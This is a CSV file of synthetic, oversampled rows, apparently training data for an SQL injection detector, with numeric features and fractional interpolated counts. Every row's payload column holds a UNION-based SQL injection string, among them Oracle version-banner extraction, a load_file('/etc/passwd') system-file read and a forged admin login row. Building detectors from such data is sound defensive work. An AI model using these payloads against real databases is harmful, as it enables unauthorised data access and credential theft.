id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001668,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R000025,0.4095966864780567,64.6062205770975,20.2787558845805,3.6692752337043957,14.0,34.884976461677994,4.0,11.721244115419498,0.21696793639360037,0.5396384763276796,0.061990838969600115,0.18140274830911998,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,6.721244115419499,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001669,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000001,1.8057111904815255,105.34059388051844,26.292574235064805,4.056779412559468,65.41485152987039,4.58514847012961,25.462871175324025,9.877722705194417,0.6219933973115047,0.043287668757218234,0.2412753851067902,0.09344354882448691,0.8777227051944166,0.0,2.0,0.0,1.0,2.2925742350648055,0.0,0.0,0.0,0.0,1.0,6.707425764935194,0.2925742350648055,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.7074257649351945,2.0,1.0,2.0,2.0,0.0,0.2925742350648055,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.292574235064805
SMOTE_001670,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000030,2.6563041069039475,84.69354686057774,27.307603795673018,4.203146094643165,41.809329780049154,14.460830365384151,18.115782919471414,10.30760379567302,0.47463907761125335,0.18779175924818856,0.21142789851801813,0.12614126462253997,1.9614056935095285,0.0,2.6538018978365097,0.0,0.34619810216349056,1.3461981021634906,0.0,0.6538018978365094,0.0,0.0,1.0,6.346198102163491,0.6538018978365094,0.0,1.0,0.0,0.0,1.0,0.6538018978365094,0.0,0.0,0.0,1.0,2.0,1.0,1.3461981021634908,0.6923962043269811,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.038594306490472
SMOTE_001671,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000030,0.6597037473368329,80.44691452240727,28.81703717836109,4.290789569599389,31.178765808962908,22.178765808962908,15.544691452240727,11.544691452240727,0.3874311458978817,0.2743114589788172,0.19426640576588708,0.14399098935741397,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.5446914522407273,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.27234572612036345,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.2723457261203635
SMOTE_001672,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,0.5137653589800245,89.52041486112738,26.253402476854564,3.8804707835905705,25.0,36.50680495370912,16.76020743056369,11.253402476854562,0.27977154868997905,0.4079390796506611,0.18665586546722346,0.1256335061921364,0.12670123842728165,0.8732987615727188,3.0,0.0,0.0,1.0,0.0,1.1267012384272812,0.0,0.0,5.126701238427281,4.0,0.12670123842728143,0.8732987615727188,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001673,attack,union," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000006,1.7028683422981816,108.26343184082914,27.304063128796763,4.066459345889887,63.391873742406474,5.391873742406474,27.175621227219427,12.304063128796763,0.586083584843142,0.0495422535207688,0.25038459926137707,0.11398956237471215,3.0,0.6081262575935247,2.0,0.0,1.0,2.6959368712032377,0.0,0.0,0.0,0.0,1.0,6.0,1.0,0.3040631287967624,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.6959368712032377,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.695936871203237
SMOTE_001674,attack,union,"-1876'||  (  select 'itfc' from dual where 9584  =  9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",nearest_attack_euclidean,R000026,1.3180049117548331,110.99685055706871,29.272154646739768,4.209888601986002,34.088618586959065,44.0,16.272154646739768,16.636077323369882,0.30612940358601587,0.39733600129506497,0.14651766930643018,0.15001692581248902,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.0,5.636077323369883,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.6360773233698833,2.0,1.0,1.0,0.6360773233698832,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.636077323369883
SMOTE_001675,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000022,0.4008987063770254,101.13331800336064,28.0,4.071271669465889,29.0,41.706654402688514,15.0,15.426663600672128,0.2873500181978868,0.4115820443669944,0.14862931975752763,0.15243861767759115,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.426663600672129,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001676,attack,union," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000007,1.0510375332442177,97.42382795554298,28.677951413993632,4.213714173881193,58.94921863702865,3.6610242930031838,21.98307287900955,12.830512146501592,0.6042539827102298,0.03708877987766701,0.2256895935531354,0.13296764385896778,2.4915364395047765,1.661024293003184,2.0,0.0,1.169487853498408,1.830512146501592,0.0,0.0,0.0,0.0,1.0,6.169487853498408,0.8305121465015919,0.8305121465015921,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.8305121465015923,1.8305121465015919,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.661024293003184
SMOTE_001677,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000013,1.7435156917346826,48.529208336003876,20.501168333440155,3.9981045379373397,14.0,22.023366668803103,4.0,8.505841667200775,0.30901233301272574,0.42918520038472907,0.08828923800363593,0.17351322859890922,0.498831666559845,0.5011683334401551,3.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,3.5058416672007757,3.0,0.49883166655984484,0.5011683334401552,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001678,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000013,0.05353065204914446,51.19579652068846,20.0,3.944321403932487,14.0,24.156637216550767,4.0,9.039159304137693,0.2736954393078912,0.47156547283053063,0.07819869694511174,0.17654039091646648,0.9869468986207692,0.013053101379230658,3.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.039159304137692,3.0,0.9869468986207692,0.013053101379230714,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001679,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000028,1.242517166528161,68.17944373193399,26.089721865966997,4.28078315315864,27.544860932983497,20.0,12.089721865966997,8.544860932983498,0.40440537281218125,0.29410547202320236,0.17648398077447744,0.12500517439013903,1.5448609329834977,0.0,3.0,0.0,0.0,0.27243046649174885,0.0,1.0,0.0,0.0,2.4551390670165025,3.5448609329834975,1.0,0.0,1.0,0.0,0.0,0.27243046649174885,1.0,0.0,0.0,0.0,0.0,1.2724304664917487,1.0,0.27243046649174885,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.5448609329834975
SMOTE_001680,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,1.2312825586238887,91.64380405890992,26.607300676484986,3.836502339677792,25.0,37.21460135296998,17.82190202945496,11.607300676484988,0.2737391930144605,0.4063304514705228,0.1934121038238043,0.12651825169121247,0.30365033824249377,0.6963496617575063,3.0,0.0,0.0,1.0,0.0,1.3036503382424938,0.0,0.0,5.303650338242494,4.0,0.30365033824249366,0.6963496617575065,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001681,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000022,0.18740145736438504,104.39238568438721,27.928657148293237,4.014562832377252,28.857314296586473,44.28537140682705,15.249699980973675,16.0,0.2766539717389435,0.4241148541970716,0.14590995089928546,0.1533212231646994,2.892985722439854,0.035671425853382066,3.0,0.0,0.0,1.0,0.0,1.0356714258533821,0.0,0.0,7.071342851706765,4.964328574146617,0.9643285741466179,0.03567142585338218,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.9643285741466179,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.964328574146618
SMOTE_001682,attack,union," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000007,0.714078877969269,100.0485667072228,28.0,4.155454099133226,59.83174078580311,3.891587039290158,23.216825921419687,13.108412960709844,0.5961515434528599,0.038836089073144814,0.2333098984265504,0.13170246904744487,3.0,2.0,2.0,0.0,1.0,1.8915870392901557,0.0,0.21682592141968837,0.0,0.0,1.0,5.891587039290156,1.0,1.0,1.0,0.0,0.0,1.0,0.1084129607098443,0.0,0.0,0.0,0.0,2.0,1.0,1.891587039290156,1.891587039290156,0.0,0.10841296070984424,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.8915870392901555
SMOTE_001683,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000015,0.27561963169373616,36.09692874603774,19.393174139882078,3.8925720841031772,14.851877303077831,8.786348279764152,8.196587069941039,4.2621160932547175,0.4115894945900704,0.23973280371821715,0.2307970278118063,0.11788067387990617,0.0655290233136796,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.19658706994103836,3.0,0.0655290233136796,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001684,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000010,2.3800388544919993,78.0,32.0,4.5366377574018895,35.0,25.0,12.0,6.0,0.44871794871794873,0.32051282051282054,0.15384615384615385,0.07692307692307693,2.4689573015210775,1.5310426984789225,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.6172393253802693,0.3827606746197308,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001685,attack,union," union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",nearest_attack_euclidean,R000003,1.9975802240479594,51.973448511193396,22.423514002132077,4.1116635668105195,25.982299007462263,4.576485997867923,10.567635501599057,10.847028004264152,0.4950641107470638,0.0961566501807285,0.20508664115765818,0.20369259791454947,1.7117570010660377,0.0,0.4323644984009436,1.7117570010660375,0.0,0.0,0.8558785005330187,1.8558785005330187,0.0,0.855878500533019,3.4235140021320754,2.144121499466981,0.8558785005330188,0.0,0.14412149946698116,0.0,0.0,0.0,1.0,0.8558785005330187,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8558785005330187,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8558785005330187
SMOTE_001686,attack,union,"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",nearest_attack_euclidean,R000014,1.5658427248928732,48.787484795984305,20.639374239799217,4.0534185206487745,14.0,22.229987836787444,4.0,8.557496959196861,0.3000869111389979,0.43989570663320254,0.08573911746828511,0.17427826475951447,0.36062576020078496,0.6393742397992154,3.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,3.5574969591968606,3.0,0.3606257602007848,0.6393742397992153,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001687,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000001,0.5453917968772799,102.38295410545999,26.385653684087515,4.093279991042419,63.76320863229241,5.851137683620074,23.46008484227748,9.308522947270012,0.6213935123317078,0.05857285283505642,0.22883984059514983,0.09119379423808599,0.23139221045250902,0.0,2.077130736817503,0.0,0.922869263182497,1.922869263182497,0.0,0.07713073681750293,0.0,0.0,1.1542614736350059,6.922869263182497,0.07713073681750293,0.0,1.0,0.0,0.0,1.0,0.07713073681750293,0.0,0.0,0.0,1.0,2.0,1.0,1.9228692631824975,1.922869263182497,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.845738526364994
SMOTE_001688,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,1.0149404853674433,78.88560193033987,25.315424077213596,4.1753948080759,27.0,30.308481544271896,11.0,10.577120386067973,0.34904471066326637,0.37597531445351345,0.14220340064059,0.13277657424263017,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,5.577120386067974,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001689,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000015,1.0300016495430802,41.83630706608232,20.469307574890436,3.9636940148009563,17.183499745595945,10.93861514978087,8.734653787445218,4.97953838326029,0.41110993423578857,0.25188166602668943,0.21848831205190677,0.11852008768561523,0.24488459581507271,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.7346537874452181,3.0,0.2448845958150726,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001690,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000030,1.5178904471155164,75.0,28.853485559384954,4.298824249882529,32.20057084769358,16.15931498276771,15.426742779692477,11.213371389846237,0.4293409446359143,0.2154575331035695,0.20568990372923301,0.14951161853128317,2.3598858304612857,0.0,2.7866286101537616,0.0,0.42674277969247654,1.0,0.0,0.7866286101537617,0.0,0.0,1.0,6.213371389846238,0.7866286101537616,0.0,1.0,0.0,0.0,1.0,0.7866286101537616,0.0,0.0,0.0,0.7866286101537617,2.0,1.0,1.0,0.2133713898462381,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.213371389846238
SMOTE_001691,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000001,2.5458388801582545,106.29996011272173,26.41249501409022,4.050281003036395,65.17500997181956,4.824990028180437,26.062475070451086,10.237485042270654,0.614294468613468,0.045112755396807286,0.24466333329407333,0.09592944269565133,1.2374850422706534,0.0,2.0,0.0,1.0,2.4124950140902177,0.0,0.0,0.0,0.0,1.0,6.587504985909782,0.4124950140902177,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.5875049859097823,2.0,1.0,2.0,2.0,0.0,0.4124950140902177,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.412495014090217
SMOTE_001692,attack,union,"-1876'||  (  select 'itfc' from dual where 9584  =  9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",nearest_attack_euclidean,R000026,0.5312811168281337,110.72428747689945,30.213785626155026,4.320530619452321,37.0,40.57942998151956,17.0,16.14485749537989,0.33621980442606136,0.3638229564202447,0.15447936960116335,0.1454778695525306,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.14485749537989,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001693,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,1.054789862811814,59.379914018744884,23.11566173276944,4.107701402051713,22.91726708766712,18.97509795405184,10.05783086638472,7.4297181106412005,0.39016913202910264,0.3057638849576651,0.18016857386376198,0.12389840914947028,0.6859436221282399,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.74377448851296,3.0,0.68594362212824,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001694,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000012,0.5978668922265461,104.13106443778875,26.3475742248845,3.7625861116977903,25.0,43.30485155023101,22.0,13.82621288755775,0.24016413229097916,0.4157373883344333,0.21134443641606165,0.13275404295852583,0.17378711244224965,0.8262128875577504,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,6.82621288755775,4.0,0.17378711244224965,0.8262128875577504,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001695,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,2.215173487810103,75.1628487722289,29.87213657917167,4.388605611699953,30.74427315834334,21.453560965286115,14.12786342082833,8.837151227771107,0.40841191949458927,0.2848763922360698,0.18849950823940803,0.11821218002993297,3.2907121930572227,0.0,2.127863420828331,0.0,0.0,1.0,0.0,0.709287806942777,0.0,0.0,1.0,3.8371512277711077,1.0,0.0,0.7092878069427768,0.0,0.0,1.0,0.7092878069427768,0.0,0.0,0.0,0.0,1.7092878069427768,1.0,0.709287806942777,-5.551115123125783e-17,0.29071219305722307,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.709287806942777
SMOTE_001696,attack,union," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000006,2.3437684391275844,101.60195137144217,27.348075875131773,4.006303709855487,56.34233074710102,4.955772374604688,27.60769649947291,12.696151750263544,0.5499221176700896,0.047670423139475254,0.27391652956560175,0.12849092962483347,3.0,0.6961517502635431,2.0,0.0,1.0,2.3038482497364567,0.0,0.6961517502635433,0.0,0.0,1.0,5.651924124868228,1.0,0.34807587513177163,1.0,0.0,0.0,1.0,0.34807587513177163,0.0,0.0,0.0,0.0,2.0,1.0,1.6519241248682284,1.6519241248682284,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.303848249736457
SMOTE_001697,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,0.9479372726415541,72.33726567102651,28.16863283551326,4.314463488591061,28.584316417756632,20.0,14.168632835513261,9.58431641775663,0.3954665664320683,0.27707917415632055,0.1952129084280474,0.13224135098356377,2.5843164177566305,0.0,3.0,0.0,0.0,0.7921582088783151,0.0,1.0,0.0,0.0,1.41568358224337,4.5843164177566305,1.0,0.0,1.0,0.0,0.0,0.7921582088783151,1.0,0.0,0.0,0.0,0.0,1.7921582088783152,1.0,0.7921582088783151,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5843164177566305
SMOTE_001698,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000028,1.2873237914455862,68.25803702662324,26.12901851331162,4.281419796229615,27.56450925665581,20.0,12.12901851331162,8.56450925665581,0.40423640688379525,0.29378363215961,0.176838004624429,0.12514195633216577,1.5645092566558099,0.0,3.0,0.0,0.0,0.282254628327905,0.0,1.0,0.0,0.0,2.43549074334419,3.56450925665581,1.0,0.0,1.0,0.0,0.0,0.2822546283279051,1.0,0.0,0.0,0.0,0.0,1.282254628327905,1.0,0.282254628327905,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.5645092566558105
